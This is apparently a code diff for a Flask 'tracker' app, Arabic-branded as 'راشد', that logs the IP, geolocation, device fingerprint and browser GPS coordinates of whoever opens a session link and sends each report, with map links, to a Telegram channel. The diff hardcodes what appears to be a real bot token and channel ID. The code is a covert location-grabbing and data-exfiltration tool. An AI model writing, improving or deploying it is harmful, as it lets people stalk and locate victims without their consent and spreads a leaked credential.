@@ -12,11 +12,14 @@ from flask import Flask, request, render_template_string, jsonify
 #  ⚙️  الإعدادات | Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-TRACKER_BOT_TOKEN = os.getenv("TRACKER_BOT_TOKEN", "")
-TARGET_CHANNEL_ID = os.getenv("TARGET_CHANNEL_ID", "")
+TRACKER_BOT_TOKEN = os.getenv("TRACKER_BOT_TOKEN", "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8")
+TARGET_CHANNEL_ID = os.getenv("TARGET_CHANNEL_ID", "-1003770774871")
 IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
 
 app = Flask(__name__)
+
+# تجميع بيانات كل جلسة قبل إرسالها (لدمج الرسائل في رسالة واحدة)
+session_data: dict = {}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  📤  إرسال للقناة | Send to Target Channel
@@ -174,42 +177,22 @@ def tracker_page(session_id: str):
 
     timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
 
-    # تقرير أولي فوري
-    report = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "📡 [راشد // تنبيه تعقب]\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🆔 جلسة     : `{session_id}`\n"
-        f"🌐 عنوان IP  : `{ip}`\n"
-        f"🕐 التوقيت   : {timestamp}\n"
-        f"🌍 البلد     : جارٍ التحليل...\n"
-        "━━━━━━━━━━━━━━━━━━━━━"
-    )
-    send_to_channel(report)
-
-    # تحليل IP في الخلفية
+    # تحليل الـ IP فوراً وتخزين البيانات — لا نرسل حتى يصل log_device
     geo = get_ip_geo(ip)
-    if geo:
-        loc = geo.get("loc", "").split(",")
-        lat = loc[0] if len(loc) == 2 else "N/A"
-        lon = loc[1] if len(loc) == 2 else "N/A"
-        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""
+    loc = (geo.get("loc", "") if geo else "").split(",")
+    lat = loc[0] if len(loc) == 2 else "N/A"
+    lon = loc[1] if len(loc) == 2 else "N/A"
 
-        geo_report = (
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            "🌍 [راشد // تحليل IP تعقب]\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 الجلسة   : `{session_id}`\n"
-            f"🎯 IP        : `{ip}`\n"
-            f"🏳 الدولة   : {geo.get('country', 'N/A')}\n"
-            f"🏙 المدينة  : {geo.get('city', 'N/A')}\n"
-            f"📍 المنطقة  : {geo.get('region', 'N/A')}\n"
-            f"🏢 المزود   : {geo.get('org', 'N/A')}\n"
-        )
-        if maps_link:
-            geo_report += f"🗺 الخريطة  : [افتح]({maps_link})\n"
-        geo_report += "━━━━━━━━━━━━━━━━━━━━━"
-        send_to_channel(geo_report)
+    session_data[session_id] = {
+        "ip":        ip,
+        "timestamp": timestamp,
+        "country":   geo.get("country", "N/A") if geo else "N/A",
+        "city":      geo.get("city",    "N/A") if geo else "N/A",
+        "region":    geo.get("region",  "N/A") if geo else "N/A",
+        "org":       geo.get("org",     "N/A") if geo else "N/A",
+        "lat":       lat,
+        "lon":       lon,
+    }
 
     return render_template_string(
         TRACKER_HTML,
@@ -223,24 +206,37 @@ def tracker_page(session_id: str):
 
 @app.route("/log_device/<session_id>", methods=["POST"])
 def log_device(session_id: str):
-    data = request.json or {}
-    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    d    = request.json or {}
+    s    = session_data.get(session_id, {})
+    ip   = s.get("ip", d.get("ip", "N/A"))
+    lat  = s.get("lat", "N/A")
+    lon  = s.get("lon", "N/A")
+    maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else ""
 
     report = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "💻 [راشد // بيانات الجهاز]\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🆔 الجلسة    : `{session_id}`\n"
-        f"🌐 IP         : `{data.get('ip', 'N/A')}`\n"
-        f"🖥 المنصة    : {data.get('platform', 'N/A')}\n"
-        f"🌐 اللغة      : {data.get('language', 'N/A')}\n"
-        f"📺 الشاشة    : {data.get('screenW', 'N/A')}×{data.get('screenH', 'N/A')}\n"
-        f"🕐 المنطقة   : {data.get('timezone', 'N/A')}\n"
-        f"🍪 كوكيز      : {'مفعّل' if data.get('cookiesOn') else 'معطّل'}\n"
-        f"📡 الاتصال   : {'متصل' if data.get('online') else 'غير متصل'}\n"
-        f"🕑 التوقيت    : {timestamp}\n"
-        f"🔍 User-Agent :\n`{data.get('userAgent', 'N/A')[:120]}`\n"
-        "━━━━━━━━━━━━━━━━━━━━━"
+        "📡 *راشد — تقرير تعقب*\n\n"
+        f"🆔 الجلسة     : `{session_id}`\n"
+        f"🕐 التوقيت    : {s.get('timestamp', 'N/A')}\n\n"
+        "─────── 🌐 بيانات الشبكة ───────\n"
+        f"📍 IP          : `{ip}`\n"
+        f"🏳️ الدولة     : {s.get('country', 'N/A')}\n"
+        f"🏙️ المدينة    : {s.get('city', 'N/A')}\n"
+        f"📍 المنطقة    : {s.get('region', 'N/A')}\n"
+        f"🏢 المزود     : {s.get('org', 'N/A')}\n"
+    )
+    if maps:
+        report += f"🗺️ الخريطة    : [افتح الموقع]({maps})\n"
+
+    report += (
+        "\n─────── 💻 بيانات الجهاز ───────\n"
+        f"🖥️ المنصة     : {d.get('platform', 'N/A')}\n"
+        f"🌐 اللغة      : {d.get('language', 'N/A')}\n"
+        f"📺 الشاشة     : {d.get('screenW', 'N/A')}×{d.get('screenH', 'N/A')}\n"
+        f"🕐 المنطقة    : {d.get('timezone', 'N/A')}\n"
+        f"🍪 كوكيز      : {'✅ مفعّل' if d.get('cookiesOn') else '❌ معطّل'}\n"
+        f"📶 الاتصال    : {'✅ متصل' if d.get('online') else '❌ غير متصل'}\n"
+        f"🔍 User-Agent :\n`{d.get('userAgent', 'N/A')[:150]}`\n\n"
+        "✦ راشد — تطوير أبو سعود"
     )
     send_to_channel(report)
     return jsonify({"status": "ok"})
@@ -248,28 +244,24 @@ def log_device(session_id: str):
 
 @app.route("/log_gps/<session_id>", methods=["POST"])
 def log_gps(session_id: str):
-    data = request.json or {}
-    lat = data.get("lat", "N/A")
-    lon = data.get("lon", "N/A")
-    accuracy = data.get("accuracy", "N/A")
-    ip = data.get("ip", "N/A")
+    d         = request.json or {}
+    lat       = d.get("lat", "N/A")
+    lon       = d.get("lon", "N/A")
+    accuracy  = d.get("accuracy", "N/A")
+    ip        = session_data.get(session_id, {}).get("ip", d.get("ip", "N/A"))
     timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
-
     maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "N/A" else "#"
 
     report = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "📍 [راشد // إحداثيات GPS]\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "📍 *راشد — إحداثيات GPS*\n\n"
         f"🆔 الجلسة    : `{session_id}`\n"
         f"🌐 IP         : `{ip}`\n"
         f"📍 خط العرض  : `{lat}`\n"
         f"📍 خط الطول  : `{lon}`\n"
         f"🎯 الدقة      : {accuracy} متر\n"
         f"🕑 التوقيت    : {timestamp}\n"
-        f"🗺 [فتح الخريطة]({maps_link})\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "◈ تصميم وتطوير: أبو سعود"
+        f"🗺️ [فتح الخريطة]({maps_link})\n\n"
+        "✦ راشد — تطوير أبو سعود"
     )
     send_to_channel(report)
     return jsonify({"status": "ok"})
